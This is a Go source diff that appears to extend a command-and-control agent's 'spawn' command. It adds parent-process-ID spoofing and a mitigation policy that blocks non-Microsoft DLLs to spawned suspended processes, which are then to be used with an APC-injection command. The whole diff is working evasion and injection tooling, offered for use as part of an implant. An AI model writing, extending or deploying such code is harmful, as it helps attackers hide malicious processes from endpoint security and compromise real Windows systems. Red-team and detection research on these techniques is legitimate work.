@@ -25,12 +25,25 @@ import (
 
 // Process creation flags
 const (
-	CREATE_SUSPENDED = 0x00000004
+	CREATE_SUSPENDED                = 0x00000004
+	EXTENDED_STARTUPINFO_PRESENT    = 0x00080000
+	CREATE_NEW_CONSOLE              = 0x00000010
 )
 
 // Thread creation flags
 const (
 	THREAD_CREATE_SUSPENDED = 0x00000004
+)
+
+// Process thread attribute constants
+const (
+	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000
+	PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
+)
+
+// Mitigation policy flags
+const (
+	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000
 )
 
 // STARTUPINFO structure for CreateProcess
@@ -63,12 +76,24 @@ type PROCESS_INFORMATION struct {
 	ThreadId  uint32
 }
 
+// STARTUPINFOEX extends STARTUPINFO with a process thread attribute list
+type STARTUPINFOEX struct {
+	StartupInfo   STARTUPINFO
+	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
+}
+
+// PROC_THREAD_ATTRIBUTE_LIST is opaque — allocated and managed by the OS
+type PROC_THREAD_ATTRIBUTE_LIST struct{}
+
 // Note: kernel32, procOpenProcess, procCreateRemoteThread, procCloseHandle are defined in vanillainjection.go
 
 var (
-	procCreateProcessW   = kernel32.NewProc("CreateProcessW")
-	procGetModuleHandleW = kernel32.NewProc("GetModuleHandleW")
-	procGetProcAddressA  = kernel32.NewProc("GetProcAddress")
+	procCreateProcessW                  = kernel32.NewProc("CreateProcessW")
+	procGetModuleHandleW                = kernel32.NewProc("GetModuleHandleW")
+	procGetProcAddressA                 = kernel32.NewProc("GetProcAddress")
+	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
+	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
+	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
 )
 
 // SpawnCommand implements the spawn command
@@ -86,9 +111,11 @@ func (c *SpawnCommand) Description() string {
 
 // SpawnParams represents the parameters for spawn
 type SpawnParams struct {
-	Mode string `json:"mode"` // "process" or "thread"
-	Path string `json:"path"` // For process mode: executable path or name
-	PID  int    `json:"pid"`  // For thread mode: target process ID
+	Mode      string `json:"mode"`       // "process" or "thread"
+	Path      string `json:"path"`       // For process mode: executable path or name
+	PID       int    `json:"pid"`        // For thread mode: target process ID
+	PPID      int    `json:"ppid"`       // Parent PID spoofing (0 = don't spoof)
+	BlockDLLs bool   `json:"blockdlls"`  // Block non-Microsoft DLLs in spawned process
 }
 
 // Execute executes the spawn command
@@ -115,7 +142,7 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 
 	switch params.Mode {
 	case "process":
-		return spawnSuspendedProcess(params.Path)
+		return spawnSuspendedProcess(params.Path, params.PPID, params.BlockDLLs)
 	case "thread":
 		return spawnSuspendedThread(params.PID)
 	default:
@@ -127,8 +154,8 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
-// spawnSuspendedProcess creates a new process in suspended state
-func spawnSuspendedProcess(path string) structs.CommandResult {
+// spawnSuspendedProcess creates a new process in suspended state with optional PPID spoofing and DLL blocking
+func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.CommandResult {
 	var output string
 	output += "[*] Spawn Mode: Suspended Process\n"
 
@@ -152,30 +179,156 @@ func spawnSuspendedProcess(path string) structs.CommandResult {
 		}
 	}
 
-	var startupInfo STARTUPINFO
+	creationFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
+	useExtended := ppid > 0 || blockDLLs
+
 	var processInfo PROCESS_INFORMATION
 
-	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
+	if useExtended {
+		// Count how many attributes we need
+		attrCount := 0
+		if ppid > 0 {
+			attrCount++
+		}
+		if blockDLLs {
+			attrCount++
+		}
 
-	// Call CreateProcessW with CREATE_SUSPENDED flag
-	ret, _, err := procCreateProcessW.Call(
-		0,                                    // lpApplicationName (NULL - use command line)
-		uintptr(unsafe.Pointer(commandLine)), // lpCommandLine
-		0,                                    // lpProcessAttributes
-		0,                                    // lpThreadAttributes
-		0,                                    // bInheritHandles
-		uintptr(CREATE_SUSPENDED),            // dwCreationFlags
-		0,                                    // lpEnvironment
-		0,                                    // lpCurrentDirectory
-		uintptr(unsafe.Pointer(&startupInfo)),
-		uintptr(unsafe.Pointer(&processInfo)),
-	)
+		// Determine attribute list size
+		var attrListSize uintptr
+		procInitializeProcThreadAttributeList.Call(
+			0,                                     // lpAttributeList (NULL for size query)
+			uintptr(attrCount),                    // dwAttributeCount
+			0,                                     // dwFlags (reserved)
+			uintptr(unsafe.Pointer(&attrListSize)), // lpSize
+		)
 
-	if ret == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
-			Status:    "error",
-			Completed: true,
+		// Allocate and initialize the attribute list
+		attrListBuf := make([]byte, attrListSize)
+		attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&attrListBuf[0]))
+
+		ret, _, err := procInitializeProcThreadAttributeList.Call(
+			uintptr(unsafe.Pointer(attrList)),
+			uintptr(attrCount),
+			0,
+			uintptr(unsafe.Pointer(&attrListSize)),
+		)
+		if ret == 0 {
+			return structs.CommandResult{
+				Output:    output + fmt.Sprintf("Error: InitializeProcThreadAttributeList failed: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(attrList)))
+
+		// PPID spoofing: open parent process and set attribute
+		var parentHandle windows.Handle
+		if ppid > 0 {
+			output += fmt.Sprintf("[*] PPID spoofing: parent PID %d\n", ppid)
+
+			hParent, errOpen := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
+			if errOpen != nil {
+				return structs.CommandResult{
+					Output:    output + fmt.Sprintf("Error: OpenProcess on PPID %d failed: %v", ppid, errOpen),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			parentHandle = hParent
+			defer windows.CloseHandle(parentHandle)
+
+			ret, _, err = procUpdateProcThreadAttribute.Call(
+				uintptr(unsafe.Pointer(attrList)),
+				0, // dwFlags
+				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+				uintptr(unsafe.Pointer(&parentHandle)),
+				unsafe.Sizeof(parentHandle),
+				0, // lpPreviousValue
+				0, // lpReturnSize
+			)
+			if ret == 0 {
+				return structs.CommandResult{
+					Output:    output + fmt.Sprintf("Error: UpdateProcThreadAttribute (PPID) failed: %v", err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			output += "[+] PPID attribute set\n"
+		}
+
+		// Block non-Microsoft DLLs
+		if blockDLLs {
+			output += "[*] Blocking non-Microsoft DLLs\n"
+			mitigationPolicy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
+
+			ret, _, err = procUpdateProcThreadAttribute.Call(
+				uintptr(unsafe.Pointer(attrList)),
+				0,
+				uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+				uintptr(unsafe.Pointer(&mitigationPolicy)),
+				unsafe.Sizeof(mitigationPolicy),
+				0,
+				0,
+			)
+			if ret == 0 {
+				return structs.CommandResult{
+					Output:    output + fmt.Sprintf("Error: UpdateProcThreadAttribute (BlockDLLs) failed: %v", err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			output += "[+] DLL blocking policy set\n"
+		}
+
+		// Create process with extended startup info
+		creationFlags |= EXTENDED_STARTUPINFO_PRESENT
+		var startupInfoEx STARTUPINFOEX
+		startupInfoEx.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoEx))
+		startupInfoEx.AttributeList = attrList
+
+		ret, _, err = procCreateProcessW.Call(
+			0,
+			uintptr(unsafe.Pointer(commandLine)),
+			0,
+			0,
+			0, // bInheritHandles must be FALSE for PPID spoofing
+			uintptr(creationFlags),
+			0,
+			0,
+			uintptr(unsafe.Pointer(&startupInfoEx)),
+			uintptr(unsafe.Pointer(&processInfo)),
+		)
+		if ret == 0 {
+			return structs.CommandResult{
+				Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	} else {
+		// Simple case: no extended attributes needed
+		var startupInfo STARTUPINFO
+		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
+
+		ret, _, err := procCreateProcessW.Call(
+			0,
+			uintptr(unsafe.Pointer(commandLine)),
+			0,
+			0,
+			0,
+			uintptr(creationFlags),
+			0,
+			0,
+			uintptr(unsafe.Pointer(&startupInfo)),
+			uintptr(unsafe.Pointer(&processInfo)),
+		)
+		if ret == 0 {
+			return structs.CommandResult{
+				Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
 		}
 	}
 
@@ -187,11 +340,6 @@ func spawnSuspendedProcess(path string) structs.CommandResult {
 	output += "\n[*] Use these values with apc-injection:\n"
 	output += fmt.Sprintf("    PID: %d\n", processInfo.ProcessId)
 	output += fmt.Sprintf("    TID: %d\n", processInfo.ThreadId)
-
-	// Note: We intentionally do NOT close the handles here
-	// The process needs to stay alive for injection
-	// The handles will be cleaned up when the agent process exits
-	// or when the injected process terminates
 
 	return structs.CommandResult{
 		Output:    output,
